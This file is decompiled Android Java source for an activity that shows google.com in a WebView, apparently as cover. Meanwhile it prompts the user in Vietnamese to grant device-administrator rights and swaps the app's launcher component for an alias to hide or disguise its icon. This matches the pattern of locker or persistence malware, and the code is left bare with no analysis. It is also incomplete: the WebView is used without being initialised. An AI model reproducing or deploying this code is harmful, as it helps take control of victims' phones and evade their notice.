package com.example.myapplicatior;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Paint;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivityAlias extends AppCompatActivity {
    private static final int RESULT_ENABLE = 0;
    private static final int VISIBILITY = 1028;
    WebSettings websettingku;
    WebView webviewku;

    /* JADX WARNING: type inference failed for: r7v0, types: [android.content.Context, com.example.myapplicatior.MainActivityAlias, androidx.appcompat.app.AppCompatActivity] */
    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        MainActivityAlias.super.onCreate(bundle);
        setContentView(2131427356);
        WebSettings settings = this.webviewku.getSettings();
        this.websettingku = settings;
        settings.setJavaScriptEnabled(true);
        this.webviewku.setWebViewClient(new WebViewClient());
        this.webviewku.loadUrl("https://www.google.com");
        if (Build.VERSION.SDK_INT >= 19) {
            this.webviewku.setLayerType(2, (Paint) null);
        } else if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT < 19) {
            this.webviewku.setLayerType(1, (Paint) null);
        }
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", new ComponentName(getApplicationContext(), MainActivity.class));
        intent.putExtra("android.app.extra.ADD_EXPLANATION", "Bấm zô nút đồng ý(ACTIVE á)");
        startActivityForResult(intent, RESULT_ENABLE);
        PackageManager packageManager = getPackageManager();
        packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), 2, 1);
        packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivityAlias.class), 1, 1);
    }
}
